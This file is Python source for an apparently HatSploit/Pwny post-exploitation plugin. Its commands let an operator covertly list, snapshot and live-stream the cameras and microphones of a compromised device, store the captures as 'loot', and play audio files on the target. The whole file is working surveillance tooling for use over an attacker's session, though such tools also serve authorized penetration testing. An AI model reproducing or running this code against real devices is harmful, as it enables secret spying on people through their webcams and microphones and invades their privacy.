"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import threading

from pwny.api import *
from pwny.types import *

from pex.proto.stream import StreamClient

from badges.cmd import Command
from hatsploit.lib.core.plugin import Plugin

import subprocess
import sys

import numpy as np

CHUNK = 1024
WIDTH = 2

MEDIA_CAM_LIST = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL)
MEDIA_MIC_PLAY = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 1)
MEDIA_MIC_LIST = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 2)

MEDIA_CAM_PIPE = tlv_custom_pipe(PIPE_STATIC, TAB_BASE, PIPE_TYPE)
MEDIA_MIC_PIPE = tlv_custom_pipe(PIPE_STATIC, TAB_BASE, PIPE_TYPE + 1)

CAM_ID = tlv_custom_type(TLV_TYPE_INT, TAB_BASE, API_TYPE)


_MIC_VIZ_CODE = '''
import sys
import threading
import queue

import numpy as np
import matplotlib.pyplot as plt
from matplotlib.animation import FuncAnimation

SAMPLES = 2048
FRAME_SIZE = SAMPLES * 2

q = queue.Queue(maxsize=30)
done = threading.Event()

def reader():
    try:
        while True:
            raw = sys.stdin.buffer.read(FRAME_SIZE)
            if not raw or len(raw) < FRAME_SIZE:
                break
            data = np.frombuffer(raw, dtype=np.int16)
            try:
                q.put_nowait(data)
            except queue.Full:
                try:
                    q.get_nowait()
                except queue.Empty:
                    pass
                q.put_nowait(data)
    finally:
        done.set()

fig, ax = plt.subplots()
x = np.arange(0, SAMPLES, 1)
line, = ax.plot(x, np.zeros(SAMPLES), "-")
ax.set_ylim(-32768, 32767)
ax.set_xlim(0, SAMPLES)
ax.set_title("Audio Stream Visualization")
ax.set_xlabel("Samples")
ax.set_ylabel("Amplitude")

t = threading.Thread(target=reader, daemon=True)
t.start()

def update(frame):
    if done.is_set():
        plt.close(fig)
        return line,
    try:
        while not q.empty():
            data = q.get_nowait()
            line.set_ydata(data)
    except Exception:
        pass
    return line,

ani = FuncAnimation(fig, update, blit=True, interval=50,
                    cache_frame_data=False)
plt.show()
'''


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "Media Plugin",
            'Plugin': "media",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - plugin developer',
            ],
            'Description': "Use built-in camera and microphone.",
        })

        self.cam_running = {}
        self.mic_running = {}

        self.commands = [
            Command({
                'Category': "gather",
                'Name': "cam",
                'Description': "Use built-in camera.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('-l', '--list'),
                        {
                            'help': "List available camera devices.",
                            'action': 'store_true'
                        }
                    ),
                    (
                        ('-s', '--snap'),
                        {
                            'help': "Take a snapshot from device.",
                            'metavar': 'ID',
                            'type': int
                        }
                    ),
                    (
                        ('-S', '--stream'),
                        {
                            'help': "Stream selected device.",
                            'metavar': 'ID',
                            'type': int
                        }
                    ),
                    (
                        ('-L',),
                        {
                            'help': "List actively streaming devices.",
                            'dest': 'streams',
                            'action': 'store_true'
                        }
                    ),
                    (
                        ('-c', '--close'),
                        {
                            'help': "Close all streams for device.",
                            'metavar': 'ID',
                            'type': int
                        }
                    ),
                    (
                        ('-o', '--output'),
                        {
                            'help': "Local file to save snapshot to.",
                            'metavar': 'FILE'
                        }
                    )
                ]
            }),
            Command({
                'Category': "gather",
                'Name': "mic",
                'Description': "Use built-in microphone.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('-l', '--list'),
                        {
                            'help': "List available audio devices.",
                            'action': 'store_true'
                        }
                    ),
                    (
                        ('-p', '--play'),
                        {
                            'help': "Play specified audio file.",
                            'metavar': 'FILE'
                        }
                    ),
                    (
                        ('-S', '--stream'),
                        {
                            'help': "Stream selected device.",
                            'metavar': 'ID',
                            'type': int
                        }
                    ),
                    (
                        ('-L',),
                        {
                            'help': "List actively streaming devices.",
                            'dest': 'streams',
                            'action': 'store_true'
                        }
                    ),
                    (
                        ('-c', '--close'),
                        {
                            'help': "Close all streams for device.",
                            'metavar': 'ID',
                            'type': int
                        }
                    ),
                    (
                        ('-o', '--output'),
                        {
                            'help': "Local file to save audio to (.wav).",
                            'metavar': 'FILE'
                        }
                    ),
                    (
                        ('-r', '--rate'),
                        {
                            'help': "Specify rate for audio (default: 48000)",
                            'type': int,
                            'default': 48000
                        }
                    ),
                    (
                        ('-C', '--channels'),
                        {
                            'help': "Specify number of channels (default: 1)",
                            'type': int,
                            'default': 1
                        }
                    ),
                    (
                        ('-f', '--format'),
                        {
                            'help': "Specify format (default: cd)",
                            'choices': ['cd', 'dat'],
                            'default': 'cd'
                        }
                    )
                ]
            }),
        ]

    # ---- Camera helpers ----

    def cam_read_thread(self, path, device):
        while True:
            stream = self.cam_running.get(device, None)

            if not stream:
                break

            frame = self.session.pipes.readall_pipe(
                pipe_type=MEDIA_CAM_PIPE,
                pipe_id=stream['ID'],
                plugin=self.plugin
            )

            try:
                with open(path, 'wb') as f:
                    f.write(frame)

            except Exception:
                self.print_error(f"Failed to write image to {path}!")

    # ---- Mic helpers ----

    def _mic_stream_thread(self, device):
        """Background thread: reads pipe, plays audio, feeds visualization."""

        while device in self.mic_running:
            stream = self.mic_running.get(device)
            if not stream:
                break

            audio = self.session.pipes.read_pipe(
                pipe_type=MEDIA_MIC_PIPE,
                pipe_id=stream['ID'],
                size=CHUNK * WIDTH * 2,
                plugin=self.plugin
            )

            data = np.frombuffer(audio, dtype=np.int16)

            if len(data) == 0:
                continue

            if len(data) < 2048:
                viz_data = np.pad(data, (0, 2048 - len(data)))
            elif len(data) > 2048:
                viz_data = data[:2048]
            else:
                viz_data = data

            try:
                stream['Process'].stdin.write(
                    viz_data.astype(np.int16).tobytes())
                stream['Process'].stdin.flush()
            except (BrokenPipeError, OSError):
                pass

            try:
                stream['Stream'].write(audio)
            except Exception:
                pass

    # ---- Command handlers ----

    def cam(self, args):
        if args.streams:
            data = []

            for device, stream in self.cam_running.items():
                data.append((device, stream['Stream'].path,
                             stream['Stream'].image))

            if not data:
                self.print_warning('No active streams running.')
                return

            self.print_table('Active streams', ('ID', 'Path', 'Image'), *data)

        elif args.close:
            stream = self.cam_running.get(args.close, None)

            if not stream:
                self.print_error(f"Device #{str(args.close)} not streaming!")
                return

            self.cam_running.pop(args.close, None)

            self.print_process(f"Suspending device #{str(args.close)}...")
            stream['Thread'].join()

            self.session.pipes.destroy_pipe(MEDIA_CAM_PIPE, stream['ID'],
                                             plugin=self.plugin)
            self.session.loot.remove_loot(stream['Stream'].image)
            self.session.loot.remove_loot(stream['Stream'].path)

        elif args.stream:
            stream = self.cam_running.get(args.stream, None)

            if stream:
                self.print_warning(f"Device #{str(args.stream)} is already streaming.")

                stream['Stream'].stream()
                return

            try:
                pipe_id = self.session.pipes.create_pipe(
                    pipe_type=MEDIA_CAM_PIPE,
                    args={
                        CAM_ID: args.stream - 1
                    },
                    plugin=self.plugin
                )

            except RuntimeError:
                self.print_error(f"Failed to open device #{str(args.stream)}!")
                return

            self.print_process(f"Streaming device #{str(args.stream)}...")

            file = self.session.loot.random_loot('png')
            path = self.session.loot.random_loot('html')

            client = StreamClient(path=path, image=file)
            client.create_video()

            thread = threading.Thread(target=self.cam_read_thread, args=(file, args.stream))
            thread.setDaemon(True)

            self.cam_running.update({
                args.stream: {
                    'Stream': client,
                    'ID': pipe_id,
                    'Thread': thread
                }
            })

            thread.start()
            client.stream()

        elif args.list:
            result = self.session.send_command(
                tag=MEDIA_CAM_LIST,
                plugin=self.plugin,
            )

            device = result.get_string(TLV_TYPE_STRING)
            id = 1

            while device:
                self.print_information(f"{str(id): <4}: {device}")
                id += 1

                device = result.get_string(TLV_TYPE_STRING)

        elif args.snap:
            try:
                pipe_id = self.session.pipes.create_pipe(
                    pipe_type=MEDIA_CAM_PIPE,
                    args={
                        CAM_ID: args.snap - 1
                    },
                    plugin=self.plugin
                )

            except RuntimeError:
                self.print_error(f"Failed to open device #{str(args.snap)}!")
                return

            output = args.output or self.session.loot.random_loot('bmp')

            try:
                with open(output, 'wb') as f:
                    f.write(
                        self.session.pipes.readall_pipe(
                            pipe_type=MEDIA_CAM_PIPE,
                            pipe_id=pipe_id,
                            plugin=self.plugin
                        )
                    )
                    self.print_success(f"Saved image to {output}!")

            except Exception:
                self.print_error(f"Failed to write image to {output}!")

            self.session.pipes.destroy_pipe(MEDIA_CAM_PIPE, pipe_id,
                                             plugin=self.plugin)

    def mic(self, args):
        import pyaudio

        if args.list:
            result = self.session.send_command(
                tag=MEDIA_MIC_LIST,
                plugin=self.plugin,
            )

            device = result.get_string(TLV_TYPE_STRING)
            id = 1

            while device:
                self.print_information(f"{str(id): <4}: {device}")
                id += 1

                device = result.get_string(TLV_TYPE_STRING)

        elif args.close:
            stream = self.mic_running.get(args.close, None)

            if not stream:
                self.print_error(f"Device #{str(args.close)} not streaming!")
                return

            self.mic_running.pop(args.close, None)
            self.print_process(f"Suspending device #{str(args.close)}...")

            self.session.pipes.destroy_pipe(MEDIA_MIC_PIPE, stream['ID'],
                                             plugin=self.plugin)

            stream['Stream'].stop_stream()
            stream['Stream'].close()

            stream['Audio'].terminate()

            try:
                stream['Process'].stdin.close()
            except Exception:
                pass

            stream['Process'].terminate()

        elif args.streams:
            data = []

            for device, stream in self.mic_running.items():
                data.append((device, stream['Stream']._rate))

            if not data:
                self.print_warning('No active streams running.')
                return

            self.print_table('Active streams', ('ID', 'Rate'), *data)

        elif args.stream:
            stream = self.mic_running.get(args.stream, None)

            if stream:
                self.print_warning(f"Device #{str(args.stream)} is already streaming.")
                return

            try:
                pipe_id = self.session.pipes.create_pipe(
                    pipe_type=MEDIA_MIC_PIPE,
                    args={
                        CAM_ID: args.stream - 1
                    },
                    plugin=self.plugin
                )

            except RuntimeError:
                self.print_error(f"Failed to open device #{str(args.stream)}!")
                return

            self.print_process(f"Streaming device #{str(args.stream)}...")

            audio = pyaudio.PyAudio()
            stream = audio.open(
                format=pyaudio.paInt16,
                channels=args.channels,
                rate=args.rate,
                frames_per_buffer=CHUNK // WIDTH,
                output=True
            )

            proc = subprocess.Popen(
                [sys.executable, '-c', _MIC_VIZ_CODE],
                stdin=subprocess.PIPE
            )

            self.mic_running.update({
                args.stream: {
                    'Stream': stream,
                    'Audio': audio,
                    'ID': pipe_id,
                    'Process': proc,
                }
            })

            thread = threading.Thread(
                target=self._mic_stream_thread,
                args=(args.stream,))
            thread.daemon = True
            thread.start()

            self.mic_running[args.stream]['Thread'] = thread
            self.print_process("Visualizing live audio wave...")

        elif args.play:
            with open(args.play, 'rb') as f:
                self.print_process("Playing audio file on device...")

                result = self.session.send_command(
                    tag=MEDIA_MIC_PLAY,
                    plugin=self.plugin,
                    args={
                        TLV_TYPE_BYTES: f.read(),
                    }
                )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to play audio file!")
                return

    def load(self):
        pass
